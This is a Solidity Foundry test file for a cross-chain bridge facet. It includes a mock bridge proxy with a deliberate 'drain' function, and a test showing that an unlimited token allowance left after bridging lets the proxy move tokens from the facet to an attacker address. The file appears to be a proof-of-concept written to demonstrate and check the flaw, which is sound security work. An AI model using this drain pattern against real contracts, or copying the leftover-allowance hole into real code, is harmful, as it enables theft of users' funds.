// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {CelerCircleBridgeFacet} from "lifi/Facets/CelerCircleBridgeFacet.sol";
import {ICircleBridgeProxy} from "lifi/Interfaces/ICircleBridgeProxy.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockCircleBridgeProxy is ICircleBridgeProxy {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function depositForBurn(
        uint256 _amount,
        uint64,
        bytes32,
        address
    ) external override returns (uint64) {
        MockERC20(token).transferFrom(msg.sender, address(this), _amount);
        return 0;
    }

    // malicious drain function exploiting leftover allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract CelerCircleBridgeFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockCircleBridgeProxy internal bridge;
    CelerCircleBridgeFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        bridge = new MockCircleBridgeProxy(address(token));
        facet = new CelerCircleBridgeFacet(
            ICircleBridgeProxy(address(bridge)),
            address(token)
        );

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 1,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        facet.startBridgeTokensViaCelerCircleBridge(bridgeData);

        // allowance remains set after bridging
        assertEq(
            token.allowance(address(facet), address(bridge)),
            type(uint256).max
        );

        // attacker sends tokens to facet and bridge drains them
        token.mint(address(facet), 5 ether);
        bridge.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

